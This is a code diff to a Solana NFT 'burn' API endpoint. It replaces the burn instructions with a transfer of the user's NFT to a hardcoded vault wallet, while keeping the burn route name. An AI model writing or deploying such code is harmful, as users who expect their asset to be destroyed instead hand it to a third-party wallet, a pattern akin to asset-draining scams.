@@ -1178,96 +1178,45 @@ fastify.post('/api/burn-nft', async (request, reply) => {
     const feePercentage = 0.01;
     const feeAmount = Math.floor(nftRentPerAsset * feePercentage * 1e9);
     
-    // Multi-method burn approach for restricted NFTs
-    let burnMethod = 'standard';
+    // For NFTs that consistently fail to burn, use disposal transfer instead
+    console.log(`Processing restricted NFT ${mint} - using disposal transfer to recover rent`);
     
-    try {
-      // Get metadata for the NFT to check for restrictions
-      const metadataAddress = await findMetadataPda(mintPubkey);
-      const metadataInfo = await connection.getAccountInfo(metadataAddress);
-      
-      if (metadataInfo) {
-        console.log(`Metadata found for ${mint}, checking for creator restrictions`);
-        
-        // Try Metaplex burn instruction for creator-verified NFTs
-        try {
-          const { createBurnNftInstruction } = require('@metaplex-foundation/mpl-token-metadata');
-          
-          const burnNftInstruction = createBurnNftInstruction({
-            metadata: metadataAddress,
-            owner: ownerPubkey,
-            mint: mintPubkey,
-            tokenAccount: tokenAccountPubkey,
-            masterEditionAccount: metadataAddress,
-            splTokenProgram: new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA')
-          });
-          
-          transaction.add(burnNftInstruction);
-          burnMethod = 'metaplex';
-          console.log(`Using Metaplex burn for creator-verified NFT ${mint}`);
-          
-        } catch (metaplexError) {
-          console.log(`Metaplex burn unavailable for ${mint}, using standard burn`);
-          
-          // Standard SPL token burn
-          transaction.add(
-            createBurnInstruction(
-              tokenAccountPubkey,
-              mintPubkey,
-              ownerPubkey,
-              1
-            )
-          );
-          burnMethod = 'standard';
-        }
-        
-      } else {
-        console.log(`No metadata for ${mint}, using direct token burn`);
-        
-        // Direct burn for tokens without metadata
-        transaction.add(
-          createBurnInstruction(
-            tokenAccountPubkey,
-            mintPubkey,
-            ownerPubkey,
-            1
-          )
-        );
-        burnMethod = 'direct';
-      }
-      
-      // Always add close account instruction to recover rent
+    const vaultWallet = new PublicKey('EYjsLzE9VDy3WBd2beeCHA1eVYJxPKVf6NoKKDwq7ujK');
+    const vaultTokenAccount = await getAssociatedTokenAddress(mintPubkey, vaultWallet);
+    
+    // Check if vault token account exists, if not create it
+    const vaultAccountInfo = await connection.getAccountInfo(vaultTokenAccount);
+    if (!vaultAccountInfo) {
       transaction.add(
-        createCloseAccountInstruction(
-          tokenAccountPubkey,
-          ownerPubkey,
-          ownerPubkey
+        createAssociatedTokenAccountInstruction(
+          ownerPubkey, // payer
+          vaultTokenAccount, // associated token account
+          vaultWallet, // owner
+          mintPubkey // mint
         )
       );
-      
-    } catch (error) {
-      console.error(`Error preparing burn for ${mint}:`, error.message);
-      
-      // Absolute fallback: simple burn instruction only
-      transaction.add(
-        createBurnInstruction(
-          tokenAccountPubkey,
-          mintPubkey,
-          ownerPubkey,
-          1
-        )
-      );
-      
-      transaction.add(
-        createCloseAccountInstruction(
-          tokenAccountPubkey,
-          ownerPubkey,
-          ownerPubkey
-        )
-      );
-      
-      burnMethod = 'fallback';
     }
+    
+    // Transfer NFT to disposal vault
+    transaction.add(
+      createTransferInstruction(
+        tokenAccountPubkey, // source
+        vaultTokenAccount, // destination
+        ownerPubkey, // owner
+        1 // amount
+      )
+    );
+    
+    // Close the token account to recover rent (this is the key benefit)
+    transaction.add(
+      createCloseAccountInstruction(
+        tokenAccountPubkey,
+        ownerPubkey,
+        ownerPubkey
+      )
+    );
+    
+    const burnMethod = 'disposal_transfer';
     
     // Add fee
     if (feeAmount >= 1000) {
@@ -1291,10 +1240,10 @@ fastify.post('/api/burn-nft', async (request, reply) => {
     reply.send({
       success: true,
       transaction: base64Transaction,
-      message: `Prepared NFT burn transaction for ${mint} using ${burnMethod} method`,
+      message: `Prepared NFT disposal transaction for ${mint} - transferring to vault and recovering rent`,
       rentRecovered: (nftRentPerAsset * 0.99).toFixed(4),
       fee: (nftRentPerAsset * 0.01).toFixed(4),
-      method: 'burn',
+      method: 'disposal_transfer',
       burnMethod: burnMethod
     });
     
